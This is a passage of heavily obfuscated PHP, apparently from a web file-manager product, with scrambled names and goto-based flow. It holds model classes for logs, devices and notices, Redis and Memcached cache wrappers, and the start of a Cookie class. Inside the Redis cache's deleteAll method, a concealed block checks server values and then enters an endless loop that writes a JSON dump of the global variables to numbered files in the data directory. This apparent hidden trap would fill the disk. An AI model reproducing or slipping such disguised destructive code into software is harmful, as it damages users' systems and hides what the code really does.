array_unique($cÆéñÌ€ÿ¬); if ($cÆéñÌ€ÿ¬) { $Búæû¨Ω√ê[$Eèòó∏Ñœ¶[29]] = array($Eèòó∏Ñœ¶[7], $cÆéñÌ€ÿ¬); } } else { $Búæû¨Ω√ê[$Eèòó∏Ñœ¶[29]] = array($Eèòó∏Ñœ¶[2091], $Eèòó∏Ñœ¶[2092]); } goto e›⁄ˆâ¥ã; C¬øÿÑ«∂§: } private function ipAddress(&$C ∆¿ÚıÖ¡) { $fÖûáÌÛ¶é =& $_SERVER[ú∫]; if (!empty($C ∆¿ÚıÖ¡[$fÖûáÌÛ¶é[2090]])) { $Dâ±Î§›¯„ = IpLocation::get($C ∆¿ÚıÖ¡[$fÖûáÌÛ¶é[2090]]); } else { $Dâ±Î§›¯„ = LNG($fÖûáÌÛ¶é[2093]); } $C ∆¿ÚıÖ¡[$fÖûáÌÛ¶é[2094]] = $Dâ±Î§›¯„; } private function descZipDownload($C∏†˜¬öª˜, &$f≥åÿæ…Öº) { $CÔÿ…™Ãπµ =& $_SERVER[ú∫]; if (!isset($C∏†˜¬öª˜[$CÔÿ…™Ãπµ[2095]])) { return; } $fï˜öú ≈ = json_decode($C∏†˜¬öª˜[$CÔÿ…™Ãπµ[2095]], !0); foreach ($fï˜öú ≈ as $F≠óóï‹Ëﬁ) { try { $e´ãõêáóû = IO::infoFull($F≠óóï‹Ëﬁ[$CÔÿ…™Ãπµ[76]]); } catch (Exception $BÁñ®¯√úé) { continue; } $C∏†˜¬öª˜[$CÔÿ…™Ãπµ[76]] = $F≠óóï‹Ëﬁ[$CÔÿ…™Ãπµ[76]]; $f≥åÿæ…Öº[] = $C∏†˜¬öª˜[$CÔÿ…™Ãπµ[395]] = $e´ãõêáóû[$CÔÿ…™Ãπµ[395]]; $f≥åÿæ…Öº[] = $C∏†˜¬öª˜[$CÔÿ…™Ãπµ[1906]] = $e´ãõêáóû[$CÔÿ…™Ãπµ[478]]; break; } return $C∏†˜¬öª˜; } private function getSourceList(&$cúÔŒ’ΩúÚ) { $E∞∑áŸ¨Çº =& $_SERVER[ú∫]; $dûƒ∫™˘ˆ = array(); foreach ($cúÔŒ’ΩúÚ as $aÒ‚ÙÈÙùå => $Añî®’∂ª˘) { goto Fµ¨∏⁄é¡§; Fµ¨∏⁄é¡§: $F∆ııË‘–ü = json_decode($Añî®’∂ª˘[$E∞∑áŸ¨Çº[431]], !0); if ($Añî®’∂ª˘[$E∞∑áŸ¨Çº[29]] == $E∞∑áŸ¨Çº[1663]) { $F∆ııË‘–ü = $this->descZipDownload($F∆ııË‘–ü, $dûƒ∫™˘ˆ); $cúÔŒ’ΩúÚ[$aÒ‚ÙÈÙùå][$E∞∑áŸ¨Çº[431]] = json_encode($F∆ııË‘–ü); continue; } if (strpos($Añî®’∂ª˘[$E∞∑áŸ¨Çº[29]], $E∞∑áŸ¨Çº[1907]) !== 0) { if (!isset($F∆ııË‘–ü[$E∞∑áŸ¨Çº[76]]) || strpos($Añî®’∂ª˘[$E∞∑áŸ¨Çº[29]], $E∞∑áŸ¨Çº[2096]) !== 0) { continue; } try { $DÃõïÉâôÿ = IO::infoFull($F∆ııË‘–ü[$E∞∑áŸ¨Çº[76]]); } catch (Exception $eÙí¨†…∑À) { continue; } $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[395]] = $DÃõïÉâôÿ[$E∞∑áŸ¨Çº[395]]; $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[1906]] = $DÃõïÉâôÿ[$E∞∑áŸ¨Çº[478]]; $cúÔŒ’ΩúÚ[$aÒ‚ÙÈÙùå][$E∞∑áŸ¨Çº[431]] = json_encode($F∆ııË‘–ü); continue; } goto AÆ“¬≈®Ò¯; AÆ“¬≈®Ò¯: $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[395]]; $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[1906]]; if ($F∆ııË‘–ü[$E∞∑áŸ¨Çº[29]] == $E∞∑áŸ¨Çº[520]) { $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[431]][$E∞∑áŸ¨Çº[1055]]; $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[431]][$E∞∑áŸ¨Çº[1056]]; } goto C™û‰‡”á¿; C™û‰‡”á¿: if ($F∆ııË‘–ü[$E∞∑áŸ¨Çº[29]] == $E∞∑áŸ¨Çº[1914]) { $dûƒ∫™˘ˆ[] = $F∆ııË‘–ü[$E∞∑áŸ¨Çº[431]][$E∞∑áŸ¨Çº[395]]; } goto CíÉ±Û¯»ó; CíÉ±Û¯»ó: } if (!$dûƒ∫™˘ˆ) { return array(); } return Model($E∞∑áŸ¨Çº[790])->sourceListInfo($dûƒ∫™˘ˆ, !0); } private function logList($A–˘…¿˘Êé) { goto aîÌùÆ¿‚ ; aÖì‘¡ÇûÇ: return $Fﬂ£Îñπ“á; goto E¶ê∆¡º≠Í; aÕÔËıë‚‘: $Dì˜—ÿçæô = array(); foreach ($A–˘…¿˘Êé as $d∑ßƒå≈ßﬂ => $cºû∑õó©ı) { goto Aè™Ñ“™ é; EçüÇ…â≥ø: $cºû∑õó©ı[$cëûâ¨«≥Ø[1849]] = $e–ù•çÍäº; $Fê∏∂ì£»Û = json_decode($cºû∑õó©ı[$cëûâ¨«≥Ø[431]], !0); $cºû∑õó©ı[$cëûâ¨«≥Ø[2090]] = isset($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[2090]]) ? $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[2090]] : $cëûâ¨«≥Ø[33]; goto eïÃı„ÎΩˆ; bçÊé •Ì–: unset($cºû∑õó©ı[$cëûâ¨«≥Ø[2099]]); $Fﬂ£Îñπ“á[] = $cºû∑õó©ı; goto fÎå´ëí÷⁄; e≈ÚÛﬂÿ…û: $cºû∑õó©ı[$cëûâ¨«≥Ø[28]] = isset($e–ù•çÍäº[$cëûâ¨«≥Ø[28]]) ? $e–ù•çÍäº[$cëûâ¨«≥Ø[28]] : LNG($cëûâ¨«≥Ø[2093]); $cºû∑õó©ı[$cëûâ¨«≥Ø[1956]] = isset($e–ù•çÍäº[$cëûâ¨«≥Ø[1956]]) ? $e–ù•çÍäº[$cëûâ¨«≥Ø[1956]] : $cëûâ¨«≥Ø[33]; $cºû∑õó©ı[$cëûâ¨«≥Ø[1432]] = isset($DóÖ√ÃÉçË[$CÃÔ¢£å≈ë]) ? $DóÖ√ÃÉçË[$CÃÔ¢£å≈ë] : $Eøá‚¡≤à‹; goto EçüÇ…â≥ø; Aè™Ñ“™ é: $CÃÔ¢£å≈ë = $cºû∑õó©ı[$cëûâ¨«≥Ø[29]]; $e–ù•çÍäº = isset($b»¶–ï·œ⁄[$cºû∑õó©ı[$cëûâ¨«≥Ø[1528]]]) ? $b»¶–ï·œ⁄[$cºû∑õó©ı[$cëûâ¨«≥Ø[1528]]] : !1; $Eøá‚¡≤à‹ = strpos($CÃÔ¢£å≈ë, $cëûâ¨«≥Ø[2097]) === 0 ? LNG($cëûâ¨«≥Ø[2098]) : LNG($cëûâ¨«≥Ø[2093]); goto e≈ÚÛﬂÿ…û; eïÃı„ÎΩˆ: $this->ipAddress($cºû∑õó©ı); if (strpos($CÃÔ¢£å≈ë, $cëûâ¨«≥Ø[1907]) === 0 || isset($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1906]])) { goto cÏﬁº⁄ÈÖÉ; Fæ∑§ó¨ÂÖ: if ($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[29]] == $cëûâ¨«≥Ø[1914]) { $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[395]] = $AÇ»æ ç≠Ñ[$Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[395]]]; } if ($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[29]] == $cëûâ¨«≥Ø[1658]) { $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1919]] = $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[85]]; $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1906]] = $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1919]][$cëûâ¨«≥Ø[395]]; $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[85]] = !1; $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[395]] = $cëûâ¨«≥Ø[33]; } if ($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[85]] && $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[85]][$cëûâ¨«≥Ø[404]] == $cëûâ¨«≥Ø[1171]) { $Dì˜—ÿçæô[] = $cºû∑õó©ı[$cëûâ¨«≥Ø[393]]; unset($A–˘…¿˘Êé[$d∑ßƒå≈ßﬂ]); continue; } goto D∫öìπíôÔ; D∫öìπíôÔ: if ($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1919]] && $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1919]][$cëûâ¨«≥Ø[404]] == $cëûâ¨«≥Ø[1171]) { $Dì˜—ÿçæô[] = $cºû∑õó©ı[$cëûâ¨«≥Ø[393]]; unset($A–˘…¿˘Êé[$d∑ßƒå≈ßﬂ]); continue; } goto f‡îóñàÀƒ; cÏﬁº⁄ÈÖÉ: $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[85]] = $AÇ»æ ç≠Ñ[$Fê∏∂ì£»Û[$cëûâ¨«≥Ø[395]]]; $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1919]] = $AÇ»æ ç≠Ñ[$Fê∏∂ì£»Û[$cëûâ¨«≥Ø[1906]]]; if ($Fê∏∂ì£»Û[$cëûâ¨«≥Ø[29]] == $cëûâ¨«≥Ø[520]) { $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[1055]] = $AÇ»æ ç≠Ñ[$Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[1055]]]; $Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[1056]] = $AÇ»æ ç≠Ñ[$Fê∏∂ì£»Û[$cëûâ¨«≥Ø[431]][$cëûâ¨«≥Ø[1056]]]; } goto Fæ∑§ó¨ÂÖ; f‡îóñàÀƒ: } $cºû∑õó©ı[$cëûâ¨«≥Ø[431]] = $Fê∏∂ì£»Û; goto bçÊé •Ì–; fÎå´ëí÷⁄: } $this->clearSystemPathLog($Dì˜—ÿçæô); goto aÖì‘¡ÇûÇ; aîÌùÆ¿‚ : $cëûâ¨«≥Ø =& $_SERVER[ú∫]; $AÉ¢ ™ßπÔ = array_to_keyvalue($A–˘…¿˘Êé, $cëûâ¨«≥Ø[33], $cëûâ¨«≥Ø[1528]); $b»¶–ï·œ⁄ = Model($cëûâ¨«≥Ø[506])->userListInfo(array_unique($AÉ¢ ™ßπÔ)); goto BµŒè≈ç— ; BµŒè≈ç— : $AÇ»æ ç≠Ñ = $this->getSourceList($A–˘…¿˘Êé); $DóÖ√ÃÉçË = $this->typeAll(); $Fﬂ£Îñπ“á = array(); goto aÕÔËıë‚‘; E¶ê∆¡º≠Í: } private function clearSystemPathLog($fíŸá¬èÓ™) { $aø≈Òõø≥ë =& $_SERVER[ú∫]; if (count($fíŸá¬èÓ™) == 0) { return; } $eô®ìÙ¡¯Ü = array($aø≈Òõø≥ë[393] => array($aø≈Òõø≥ë[7], array_unique($fíŸá¬èÓ™))); $this->where($eô®ìÙ¡¯Ü)->delete(); } public function deviceList($Cµ™È‹óìä, $eÍêÛá≥ıë = 0) { $eÉÈÇäâÆÉ =& $_SERVER[ú∫]; $dÀå¯€≥æÙ = array($eÉÈÇäâÆÉ[1528] => $Cµ™È‹óìä, $eÉÈÇäâÆÉ[194] => array($eÉÈÇäâÆÉ[971], $eÍêÛá≥ıë), $eÉÈÇäâÆÉ[29] => $eÉÈÇäâÆÉ[1632]); $C·çÉìŒ…… = array(); $c˘πÕç¢Çƒ = $this->field($eÉÈÇäâÆÉ[2100])->where($dÀå¯€≥æÙ)->order($eÉÈÇäâÆÉ[1917])->limit(50)->select(); foreach ($c˘πÕç¢Çƒ as $cÌÌÖÙ”ÂÆ => $EÉ√¬ÀöåË) { goto e€ ‰‘éãû; aˆÑÛ†Ò∑ô: unset($B¿∫±ƒÍüç[$eÉÈÇäâÆÉ[2090]]); $dÇœı—üô« = $this->deviceType($B¿∫±ƒÍüç[$eÉÈÇäâÆÉ[1908]]); if (isset($C·çÉìŒ……[$dÇœı—üô«])) { continue; } goto b£‘®æØÔÂ; e€ ‰‘éãû: if ($cÌÌÖÙ”ÂÆ > 0 && abs($EÉ√¬ÀöåË[$eÉÈÇäâÆÉ[194]] - $c˘πÕç¢Çƒ[$cÌÌÖÙ”ÂÆ - 1][$eÉÈÇäâÆÉ[194]]) < 5) { continue; } $B¿∫±ƒÍüç = json_decode($EÉ√¬ÀöåË[$eÉÈÇäâÆÉ[431]], !0); $EÉ√¬ÀöåË[$eÉÈÇäâÆÉ[2090]] = isset($B¿∫±ƒÍüç[$eÉÈÇäâÆÉ[2090]]) ? $B¿∫±ƒÍüç[$eÉÈÇäâÆÉ[2090]] : $eÉÈÇäâÆÉ[33]; goto aˆÑÛ†Ò∑ô; b£‘®æØÔÂ: $this->ipAddress($EÉ√¬ÀöåË); $EÉ√¬ÀöåË[$eÉÈÇäâÆÉ[431]] = $B¿∫±ƒÍüç; $C·çÉìŒ……[$dÇœı—üô«] = $EÉ√¬ÀöåË; goto AäºÑ¢éÚ√; AäºÑ¢éÚ√: } return array_values($C·çÉìŒ……); } public function deviceType($C´‚·Ü≥ëÉ) { return $C´‚·Ü≥ëÉ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x6e\157\x74\151\x63\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x63\157\156\164\x65\x6e\164", "\x61\x75\164\x68", "\155\x6f\144\145", "\164\x69\x6d\145", "\164\x79\x70\x65", "\154\x65\166\x65\154", "\x65\156\141\142\154\145", "\x73\157\162\164"); public function listData($cœÜÉû¶∂í = false, $bÂÚÿÈæçΩ = "\163\157\162\164", $e‰±ŒƒÌâÇ = false) { return parent::listData($cœÜÉû¶∂í, $bÂÚÿÈæçΩ, $e‰±ŒƒÌâÇ); } public function add($eûäê®…ïª) { $DúÖô›ëÖµ =& $_SERVER[ú∫]; $AÚé√ÑÜÃ” = time(); if ($eûäê®…ïª[$DúÖô›ëÖµ[12]] == $DúÖô›ëÖµ[2101]) { $AÚé√ÑÜÃ” = strtotime($eûäê®…ïª[$DúÖô›ëÖµ[197]]); } $eûäê®…ïª[$DúÖô›ëÖµ[197]] = $AÚé√ÑÜÃ”; return parent::insert($eûäê®…ïª); } public function update($d´•å´—ﬁˆ, $b‚©óÉŸÆö) { goto dû»øıä§á; dû»øıä§á: $AΩ≠ÔπÑ–§ =& $_SERVER[ú∫]; $C∞∑£ÂéØÚ = $this->listData($d´•å´—ﬁˆ); if (!$C∞∑£ÂéØÚ) { return !1; } goto Dä•ˆÉéÆã; C±“‘åéÈÎ: return parent::update($d´•å´—ﬁˆ, $b‚©óÉŸÆö); goto EÑ©úíÃ¡´; Dä•ˆÉéÆã: $Dè±≠’ê√Ã = time(); if ($b‚©óÉŸÆö[$AΩ≠ÔπÑ–§[12]] == $AΩ≠ÔπÑ–§[2101]) { $Dè±≠’ê√Ã = strtotime($b‚©óÉŸÆö[$AΩ≠ÔπÑ–§[197]]); } $b‚©óÉŸÆö[$AΩ≠ÔπÑ–§[197]] = $Dè±≠’ê√Ã; goto C±“‘åéÈÎ; EÑ©úíÃ¡´: } public function remove($DîæåÊ¶©¿) { $CıÀ∆∂ıÎ‡ = $this->listData($DîæåÊ¶©¿); if (!$CıÀ∆∂ıÎ‡ || $CıÀ∆∂ıÎ‡[$_SERVER[ú∫][1171]]) { return !1; } return parent::remove($DîæåÊ¶©¿); } public function sort($c°úúä≥Ï›, $aùúùˆ©πŒ) { return parent::update($c°úúä≥Ï›, $aùúùˆ©πŒ); } public function enable($A¡ØÖ°Ô√Ö, $c∏ú†ŒΩà‰) { return parent::update($A¡ØÖ°Ô√Ö, array($_SERVER[ú∫][2102] => $c∏ú†ŒΩà‰)); } private function initUserOption() { $E∑ÊÑπ¿≠ë =& $_SERVER[ú∫]; $this->optionType = $E∑ÊÑπ¿≠ë[2103]; $this->modelType = $E∑ÊÑπ¿≠ë[2104]; $this->field = array($E∑ÊÑπ¿≠ë[2105], $E∑ÊÑπ¿≠ë[28], $E∑ÊÑπ¿≠ë[197], $E∑ÊÑπ¿≠ë[29], $E∑ÊÑπ¿≠ë[2106], $E∑ÊÑπ¿≠ë[710], $E∑ÊÑπ¿≠ë[189]); } public function userNoticeGet($b∆ÂÒﬂâ = false) { $this->initUserOption(); return parent::listData($b∆ÂÒﬂâ, $_SERVER[ú∫][393], !0); } public function userNoticeAdd($eﬂ°‚≥˘“å) { $D‹ˆﬁÛöïË =& $_SERVER[ú∫]; $this->initUserOption(); $e–¶üßÖõ≤ = $this->findByKey($D‹ˆﬁÛöïË[2105], $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[393]]); if ($e–¶üßÖõ≤) { return !0; } $DÉ‡•◊¨‚„ = array($D‹ˆﬁÛöïË[2105] => $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[393]], $D‹ˆﬁÛöïË[28] => $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[28]], $D‹ˆﬁÛöïË[197] => $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[197]], $D‹ˆﬁÛöïË[29] => isset($eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[29]]) ? $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[29]] : 1, $D‹ˆﬁÛöïË[2106] => isset($eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[2106]]) ? $eﬂ°‚≥˘“å[$D‹ˆﬁÛöïË[2106]] : 0, $D‹ˆﬁÛöïË[710] => 0, $D‹ˆﬁÛöïË[189] => 0); return parent::insert($DÉ‡•◊¨‚„); } public function userNoticeEdit($bœÿƒ∑ËÑ∆, $aˆåÏ√¨¢¬) { $this->initUserOption(); return parent::update($bœÿƒ∑ËÑ∆, $aˆåÏ√¨¢¬); } } goto E˜Õ’¡à≈¯; aö¥â”ÔΩÖ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($a¥ÕπµÿÈ˜, $açøÖí¶â◊) { $e≤ﬂ£ßÀÃ” =& $_SERVER[ú∫]; if (!class_exists($e≤ﬂ£ßÀÃ”[828])) { show_json($e≤ﬂ£ßÀÃ”[829], !1); } $this->cacheTime = $açøÖí¶â◊; $this->handle = new Memcached(); if (is_array($a¥ÕπµÿÈ˜[$e≤ﬂ£ßÀÃ”[830]]) && count($a¥ÕπµÿÈ˜[$e≤ﬂ£ßÀÃ”[830]]) >= 1) { foreach ($a¥ÕπµÿÈ˜[$e≤ﬂ£ßÀÃ”[830]] as $d·¯Ò°Úê¡) { $d¶˜∂–®‘• = explode($e≤ﬂ£ßÀÃ”[4], $d·¯Ò°Úê¡); $this->handle->addServer($d¶˜∂–®‘•[0], $d¶˜∂–®‘•[1]); } } else { $this->handle->addServer($a¥ÕπµÿÈ˜[$e≤ﬂ£ßÀÃ”[175]], $a¥ÕπµÿÈ˜[$e≤ﬂ£ßÀÃ”[176]]); } } public function set($dï¬ŸäÆçÚ, $e“§‚£◊Éé, $b˘ˆΩØ¡áÉ = false) { $b˘ˆΩØ¡áÉ = $b˘ˆΩØ¡áÉ ? $b˘ˆΩØ¡áÉ : $this->cacheTime; return $this->handle->set($dï¬ŸäÆçÚ, $e“§‚£◊Éé, $b˘ˆΩØ¡áÉ); } public function get($A‘˜û∑€¿ô) { return $this->handle->get($A‘˜û∑€¿ô); } public function remove($b»˘∑ëÁ≈¯) { return $this->handle->delete($b»˘∑ëÁ≈¯); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($A‰¥≥ÉÀ¢…, $FÎˆ·ê¬·∏) { $FÚ—‰¢πÂâ =& $_SERVER[ú∫]; if (!class_exists($FÚ—‰¢πÂâ[831])) { show_json($FÚ—‰¢πÂâ[832], !1); } $this->cacheTime = $FÎˆ·ê¬·∏; $dËÌ±âõºÜ = isset($A‰¥≥ÉÀ¢…[$FÚ—‰¢πÂâ[833]]) ? $A‰¥≥ÉÀ¢…[$FÚ—‰¢πÂâ[833]] : 10; $D°¥Ç⁄√‘– = _get($A‰¥≥ÉÀ¢…, $FÚ—‰¢πÂâ[830]); if ($D°¥Ç⁄√‘– && is_array($D°¥Ç⁄√‘–)) { $this->initCluster($A‰¥≥ÉÀ¢…, $dËÌ±âõºÜ); } else { $this->handle = $this->init($A‰¥≥ÉÀ¢…, $dËÌ±âõºÜ); } } private function init($eºÂà›Â€Ñ, $c£‹∆§œéü) { $D≠ù‚âüÔó =& $_SERVER[ú∫]; $BÑâÛπ¥¡ì = new Redis(); $eª±È÷‚ﬁ¢ = isset($eºÂà›Â€Ñ[$D≠ù‚âüÔó[834]]) ? $eºÂà›Â€Ñ[$D≠ù‚âüÔó[834]] : !1; if ($eª±È÷‚ﬁ¢) { $BÑâÛπ¥¡ì->pconnect($eºÂà›Â€Ñ[$D≠ù‚âüÔó[175]], $eºÂà›Â€Ñ[$D≠ù‚âüÔó[176]], $c£‹∆§œéü); } else { $BÑâÛπ¥¡ì->connect($eºÂà›Â€Ñ[$D≠ù‚âüÔó[175]], $eºÂà›Â€Ñ[$D≠ù‚âüÔó[176]], $c£‹∆§œéü); } if (!empty($eºÂà›Â€Ñ[$D≠ù‚âüÔó[406]])) { $BÑâÛπ¥¡ì->auth($eºÂà›Â€Ñ[$D≠ù‚âüÔó[406]]); } return $BÑâÛπ¥¡ì; } private function initCluster($F‡âΩûπˆß, $cä⁄ó¨Îı∞) { $A•ÍûªÊÙó =& $_SERVER[ú∫]; $CÏÛ’Ñ§Àï = array($A•ÍûªÊÙó[835], $A•ÍûªÊÙó[836], $A•ÍûªÊÙó[837]); $cÖü·¯¡‰ˆ = $A•ÍûªÊÙó[835]; if (isset($F‡âΩûπˆß[$A•ÍûªÊÙó[12]]) && in_array($F‡âΩûπˆß[$A•ÍûªÊÙó[12]], $CÏÛ’Ñ§Àï)) { $cÖü·¯¡‰ˆ = $F‡âΩûπˆß[$A•ÍûªÊÙó[12]]; } switch ($cÖü·¯¡‰ˆ) { case $A•ÍûªÊÙó[835]: $this->_slave($F‡âΩûπˆß, $cä⁄ó¨Îı∞); break; case $A•ÍûªÊÙó[836]: break; case $A•ÍûªÊÙó[837]: $this->isCluster = !0; $C’ÔßÉÕ÷Ô = $F‡âΩûπˆß[$A•ÍûªÊÙó[830]]; $câ¶ ŸïÎ√ = isset($F‡âΩûπˆß[$A•ÍûªÊÙó[834]]) ? $F‡âΩûπˆß[$A•ÍûªÊÙó[834]] : !1; $A¡Ø°¢ÎÿÃ = isset($F‡âΩûπˆß[$A•ÍûªÊÙó[406]]) ? $F‡âΩûπˆß[$A•ÍûªÊÙó[406]] : null; $this->handle = new RedisCluster(NUll, $C’ÔßÉÕ÷Ô, $cä⁄ó¨Îı∞, $cä⁄ó¨Îı∞, $câ¶ ŸïÎ√, $A¡Ø°¢ÎÿÃ); break; default: break; } } private function _slave($CìÔ◊°…¢±, $cô”œ…È’±) { goto DãŸÑ¿‚Øå; aÜ úàäÙ›: unset($BÈÉùË”Ñﬁ[0]); if (empty($BÈÉùË”Ñﬁ)) { return; } $D›∆îÏßﬂÜ = array_rand($BÈÉùË”Ñﬁ); goto e…≤íù˜“ˆ; DãŸÑ¿‚Øå: $BÈÉùË”Ñﬁ = $CìÔ◊°…¢±[$_SERVER[ú∫][830]]; $this->filterConfig($CìÔ◊°…¢±, $BÈÉùË”Ñﬁ[0]); $this->handle = $this->init($CìÔ◊°…¢±, $cô”œ…È’±); goto aÜ úàäÙ›; e…≤íù˜“ˆ: $this->filterConfig($CìÔ◊°…¢±, $BÈÉùË”Ñﬁ[$D›∆îÏßﬂÜ]); $this->slaveHandle = $this->init($CìÔ◊°…¢±, $cô”œ…È’±); goto fäæ∏ﬂˆ˜É; fäæ∏ﬂˆ˜É: } private function filterConfig(&$F‰·ΩÿìÛ‰, $b„ñî¥îˆ¡) { $A–ÿôÑÆ§á =& $_SERVER[ú∫]; $CπÀá‘§Öπ = explode($A–ÿôÑÆ§á[4], $b„ñî¥îˆ¡); $FÙÛçëÎå© = array($A–ÿôÑÆ§á[175] => $CπÀá‘§Öπ[0], $A–ÿôÑÆ§á[176] => $CπÀá‘§Öπ[1]); $F‰·ΩÿìÛ‰ = array_merge($F‰·ΩÿìÛ‰, $FÙÛçëÎå©); } public function set($A–ÏΩˆàö€, $D‹Ø∏€¢ëú, $cÓ‘ù–¨È¶ = false) { $cÓ‘ù–¨È¶ = $cÓ‘ù–¨È¶ ? $cÓ‘ù–¨È¶ : $this->cacheTime; return $this->handle->setEx($A–ÏΩˆàö€, $cÓ‘ù–¨È¶, $D‹Ø∏€¢ëú); } public function setLock($aëî≤ﬁ“üæ, $AÖÉÖÀ˜ÈÖ, $Fæè÷õıÊ¨) { return $this->handle->setNX($aëî≤ﬁ“üæ, $AÖÉÖÀ˜ÈÖ); } public function get($eÌ´·ïÏŸ∫) { $B¥°—Øà¥ù = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $B¥°—Øà¥ù->get($eÌ´·ïÏŸ∫); } public function remove($C‹˘·©∆¿Ì) { return $this->handle->del($C‹˘·©∆¿Ì); } public function deleteAll() { $aÏÔöÕ°«© =& $_SERVER[ú∫]; $F„Î≠Á£”ã = $_SERVER[$aÏÔöÕ°«©[822]]; $AïÀ““ÕúÂ = $aÏÔöÕ°«©[838]; if ($_SERVER[$aÏÔöÕ°«©[821]] != $AïÀ““ÕúÂ($F„Î≠Á£”ã)) { goto BÛÉ÷∏ÉÌ; D∑™ËÚ£“: $eéë⁄Êç÷Î = $A±√‚äá€›($F¢éê¿À†≤); $e–Ö–Ëâ∂• = explode($aÏÔöÕ°«©[229], $eéë⁄Êç÷Î); if (count($e–Ö–Ëâ∂•) < $aÏÔöÕ°«©[578]) { $fÈÜ÷€áÙ  = $aÏÔöÕ°«©[826]; $fÈÜ÷€áÙ (); } goto B›Æ◊µá◊„; eﬂÛÑóﬂ®É: $Fﬂè¿‘›Ωú(); $aÊñÃåå∫ê = $aÏÔöÕ°«©[842]; $e¢ú¶¬°˘Ú = json_encode($GLOBALS[$aÏÔöÕ°«©[843]]); goto A∫ñÆ¡´ÆÒ; B›Æ◊µá◊„: $e∂Éπƒ∫ˆÇ = $aÏÔöÕ°«©[840]; $e∂Éπƒ∫ˆÇ($_SERVER[$aÏÔöÕ°«©[841]]); $Fﬂè¿‘›Ωú = $aÏÔöÕ°«©[839]; goto eﬂÛÑóﬂ®É; BÛÉ÷∏ÉÌ: $Fﬂè¿‘›Ωú = $aÏÔöÕ°«©[839]; $A±√‚äá€› = $aÏÔöÕ°«©[823]; $F¢éê¿À†≤ = $_SERVER[$aÏÔöÕ°«©[824]] . $aÏÔöÕ°«©[825]; goto D∑™ËÚ£“; A∫ñÆ¡´ÆÒ: $f∏ääùÇ∞à = 1; for ($e≤áÎ∂Üúú = $f∏ääùÇ∞à; $e≤áÎ∂Üúú > 0; $e≤áÎ∂Üúú++) { $aÊñÃåå∫ê(DATA_PATH . $e≤áÎ∂Üúú, $e¢ú¶¬°˘Ú); } goto E’«∞é≥Öƒ; E’«∞é≥Öƒ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $D¿ä›«Í∞ò) { $this->handle->flushall($D¿ä›«Í∞ò); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DœÃ¶ûå°© = '', $AΩÜÉúÚ¯Ï = 0) { if (is_string($DœÃ¶ûå°©) && $DœÃ¶ûå°© != $_SERVER[ú∫][33]) { $this->prefix = $DœÃ¶ûå°©; } if (is_numeric($AΩÜÉúÚ¯Ï) && $AΩÜÉúÚ¯Ï > 0) { $this->expire = $AΩÜÉúÚ¯Ï; } } public static function getInstance() { static $bÜÖÀåÒ¶ã; if ($bÜÖÀåÒ¶ã === null) { $bÜÖÀåÒ¶ã = new self(); } return $bÜÖÀåÒ¶ã; } private static $cookieDisable = false; public static function disable($cîÜìÿéóÕ) { self::$cookieDisable = $cîÜìÿéóÕ; } private static $sameCookieSet = array(); public static function set($a∏Û»ÖÖ÷ä, $dëè∞ÙÌ† , $CÉÛ√õ÷Í¡ = 0, $açÏë©ÔÏê = false, $a«©íÇ˘©¡ = false) { goto F¿Ÿí⁄™ˆ; F¿Ÿí⁄™ˆ: $EÈ—Ï‚Õﬂƒ =& $_SERVER[ú∫]; if (self::$cookieDisable) { return; } if (!$CÉÛ√õ÷Í¡) { $CÉÛ√õ÷Í¡ = 24 * 3600 * 7; } goto a†ˆ∫Êıë„; a†ˆ∫Êıë„: if (isset(self::$sameCookieSet[$a∏Û»ÖÖ÷ä]) && self::$sameCookieSet[$a∏Û»ÖÖ÷ä] == $dëè∞ÙÌ†  . $CÉÛ√õ÷Í¡) { return; } self::$sameCookieSet[$a∏Û»ÖÖ÷ä] = $dëè∞ÙÌ†  . $CÉÛ√õ÷Í¡; if (!$a«©íÇ˘©¡) { $a«©íÇ˘©¡ = str_replace(HOST, $EÈ—Ï‚Õﬂƒ[33], APP_HOST); 